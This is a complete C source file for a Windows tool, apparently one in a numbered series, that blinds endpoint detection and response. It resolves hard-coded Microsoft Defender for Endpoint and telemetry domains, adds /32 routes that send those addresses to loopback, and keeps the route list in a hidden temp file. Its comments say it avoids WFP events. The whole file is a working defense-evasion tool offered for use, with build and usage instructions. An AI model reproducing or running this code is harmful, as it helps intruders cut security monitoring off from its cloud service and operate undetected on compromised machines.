/*
 * 07_null_route.c
 * Null Routing / Blackhole Routing — redirect EDR cloud IPs to loopback
 *
 * Adds static routes that send EDR traffic to 127.0.0.1 (loopback interface).
 * Since no service listens on those addresses at port 443, connections fail.
 *
 * Works at the IP routing table level — below WFP, no WFP events.
 * Also resolves target hostnames to IPs before installation.
 *
 * Build:
 *   cl 07_null_route.c /link iphlpapi.lib ws2_32.lib
 *
 * Usage:
 *   07_null_route.exe install             (resolve and block all EDR IPs)
 *   07_null_route.exe install <ip1> ...   (block specific IPs)
 *   07_null_route.exe remove              (remove all installed routes)
 *   07_null_route.exe resolve <hostname>  (show IPs for hostname)
 */

#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <windows.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

#define LOOPBACK_GATEWAY "127.0.0.1"

/* EDR cloud domains to resolve and null-route */
static const char *EDR_DOMAINS[] = {
    "endpoint.security.microsoft.com",
    "us.vortex-win.data.microsoft.com",
    "v20.vortex-win.data.microsoft.com",
    "settings-win.data.microsoft.com",
    "events.data.microsoft.com",
    "winatp-gw-cus.microsoft.com",
    "winatp-gw-eus.microsoft.com",
    NULL
};

/* We store added routes so we can remove them later */
#define MAX_ROUTES 256
static DWORD g_AddedRoutes[MAX_ROUTES];
static int   g_RouteCount = 0;

/* Save routes to a temp file for persistence across invocations */
static const WCHAR *ROUTE_SAVE_FILE = L"C:\\Windows\\Temp\\.nullroutes";

static void SaveRoutes(void)
{
    FILE *f = NULL;
    _wfopen_s(&f, ROUTE_SAVE_FILE, L"w");
    if (!f) return;
    for (int i = 0; i < g_RouteCount; i++) {
        fwprintf(f, L"%lu\n", g_AddedRoutes[i]);
    }
    fclose(f);
}

static int LoadRoutes(void)
{
    FILE *f = NULL;
    _wfopen_s(&f, ROUTE_SAVE_FILE, L"r");
    if (!f) return 0;
    DWORD ip;
    while (fwscanf_s(f, L"%lu", &ip) == 1 && g_RouteCount < MAX_ROUTES) {
        g_AddedRoutes[g_RouteCount++] = ip;
    }
    fclose(f);
    return g_RouteCount;
}

/* Get the loopback interface index */
static DWORD GetLoopbackIfIndex(void)
{
    /* Find the interface with 127.0.0.1 */
    ULONG bufSize = sizeof(IP_ADAPTER_INFO) * 16;
    PIP_ADAPTER_INFO pInfo = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), 0, bufSize);
    if (GetAdaptersInfo(pInfo, &bufSize) != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, pInfo);
        /* Default: index 1 is usually loopback */
        return 1;
    }

    DWORD loopIdx = 1;
    PIP_ADAPTER_INFO p = pInfo;
    while (p) {
        if (strcmp(p->IpAddressList.IpAddress.String, "127.0.0.1") == 0) {
            loopIdx = p->Index;
            break;
        }
        p = p->Next;
    }
    HeapFree(GetProcessHeap(), 0, pInfo);
    return loopIdx;
}

/* Add a host route to loopback */
static BOOL AddNullRoute(DWORD destIpNBO)
{
    if (g_RouteCount >= MAX_ROUTES) return FALSE;

    /* Convert to string for display */
    struct in_addr ia = { destIpNBO };
    char ipStr[16] = {0};
    inet_ntop(AF_INET, &ia, ipStr, sizeof(ipStr));

    /* Check if route already exists */
    for (int i = 0; i < g_RouteCount; i++) {
        if (g_AddedRoutes[i] == destIpNBO) {
            wprintf(L"  [~] Already have route for %S\n", ipStr);
            return TRUE;
        }
    }

    MIB_IPFORWARDROW route = {0};
    route.dwForwardDest    = destIpNBO;
    route.dwForwardMask    = 0xFFFFFFFF;              /* /32 host route */
    route.dwForwardNextHop = inet_addr(LOOPBACK_GATEWAY);
    route.dwForwardIfIndex = GetLoopbackIfIndex();
    route.dwForwardType    = MIB_IPROUTE_TYPE_DIRECT;
    route.dwForwardProto   = MIB_IPPROTO_NETMGMT;
    route.dwForwardAge     = INFINITE;
    route.dwForwardMetric1 = 1;                       /* highest priority */

    DWORD err = CreateIpForwardEntry(&route);
    if (err != NO_ERROR) {
        wprintf(L"  [-] Failed to add route for %S: %lu\n", ipStr, err);
        return FALSE;
    }

    g_AddedRoutes[g_RouteCount++] = destIpNBO;
    wprintf(L"  [+] Null route: %S → %s\n", ipStr, LOOPBACK_GATEWAY);
    return TRUE;
}

/* Remove a host route */
static BOOL RemoveNullRoute(DWORD destIpNBO)
{
    struct in_addr ia = { destIpNBO };
    char ipStr[16] = {0};
    inet_ntop(AF_INET, &ia, ipStr, sizeof(ipStr));

    MIB_IPFORWARDROW route = {0};
    route.dwForwardDest    = destIpNBO;
    route.dwForwardMask    = 0xFFFFFFFF;
    route.dwForwardNextHop = inet_addr(LOOPBACK_GATEWAY);
    route.dwForwardIfIndex = GetLoopbackIfIndex();
    route.dwForwardType    = MIB_IPROUTE_TYPE_DIRECT;
    route.dwForwardProto   = MIB_IPPROTO_NETMGMT;

    DWORD err = DeleteIpForwardEntry(&route);
    if (err != NO_ERROR) {
        wprintf(L"  [-] Failed to remove route for %S: %lu\n", ipStr, err);
        return FALSE;
    }
    wprintf(L"  [+] Removed null route for: %S\n", ipStr);
    return TRUE;
}

/* Resolve hostname and return all IPs */
static int ResolveHost(const char *host, DWORD *ips, int maxIps)
{
    struct addrinfo hints = {0};
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    struct addrinfo *result = NULL;
    int count = 0;

    if (getaddrinfo(host, NULL, &hints, &result) != 0) {
        wprintf(L"  [-] Could not resolve: %S\n", host);
        return 0;
    }

    for (struct addrinfo *p = result; p != NULL && count < maxIps; p = p->ai_next) {
        struct sockaddr_in *sin = (struct sockaddr_in *)p->ai_addr;
        ips[count++] = sin->sin_addr.s_addr;
    }
    freeaddrinfo(result);
    return count;
}

int main(int argc, char *argv[])
{
    WSADATA wsd;
    WSAStartup(MAKEWORD(2,2), &wsd);

    wprintf(L"[*] Null Route Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %S install             Resolve and null-route all EDR domains\n", argv[0]);
        wprintf(L"  %S install <ip1> ...   Null-route specific IPs\n", argv[0]);
        wprintf(L"  %S remove              Remove all null routes\n", argv[0]);
        wprintf(L"  %S resolve <host>      Show IPs for hostname\n", argv[0]);
        WSACleanup();
        return 1;
    }

    if (strcmp(argv[1], "resolve") == 0 && argc >= 3) {
        DWORD ips[32];
        int count = ResolveHost(argv[2], ips, 32);
        wprintf(L"IPs for %S:\n", argv[2]);
        for (int i = 0; i < count; i++) {
            struct in_addr ia = { ips[i] };
            char buf[16];
            inet_ntop(AF_INET, &ia, buf, sizeof(buf));
            wprintf(L"  %S\n", buf);
        }
        WSACleanup();
        return 0;
    }

    if (strcmp(argv[1], "remove") == 0) {
        LoadRoutes();
        if (g_RouteCount == 0) {
            wprintf(L"[-] No saved routes found at %s\n", ROUTE_SAVE_FILE);
            WSACleanup();
            return 0;
        }
        wprintf(L"[*] Removing %d null route(s)...\n", g_RouteCount);
        for (int i = 0; i < g_RouteCount; i++) {
            RemoveNullRoute(g_AddedRoutes[i]);
        }
        DeleteFileW(ROUTE_SAVE_FILE);
        WSACleanup();
        return 0;
    }

    if (strcmp(argv[1], "install") == 0) {
        if (argc >= 3) {
            /* Specific IPs given */
            wprintf(L"[*] Adding null routes for %d specified IP(s)...\n", argc-2);
            for (int i = 2; i < argc; i++) {
                DWORD ip = inet_addr(argv[i]);
                if (ip == INADDR_NONE) {
                    wprintf(L"  [-] Invalid IP: %S\n", argv[i]);
                    continue;
                }
                AddNullRoute(ip);
            }
        } else {
            /* Resolve all EDR domains */
            wprintf(L"[*] Resolving EDR domains and adding null routes...\n\n");
            for (int i = 0; EDR_DOMAINS[i] != NULL; i++) {
                wprintf(L"[*] %S\n", EDR_DOMAINS[i]);
                DWORD ips[32];
                int count = ResolveHost(EDR_DOMAINS[i], ips, 32);
                for (int j = 0; j < count; j++) {
                    AddNullRoute(ips[j]);
                }
            }
        }

        SaveRoutes();
        wprintf(L"\n[+] Routes installed and saved to %s\n", ROUTE_SAVE_FILE);
        wprintf(L"[+] Run 'remove' to restore normal routing.\n");
        wprintf(L"[*] Routes survive reboots only if ROUTE -P was used (not here).\n");
        WSACleanup();
        return 0;
    }

    wprintf(L"[-] Unknown command: %S\n", argv[1]);
    WSACleanup();
    return 1;
}
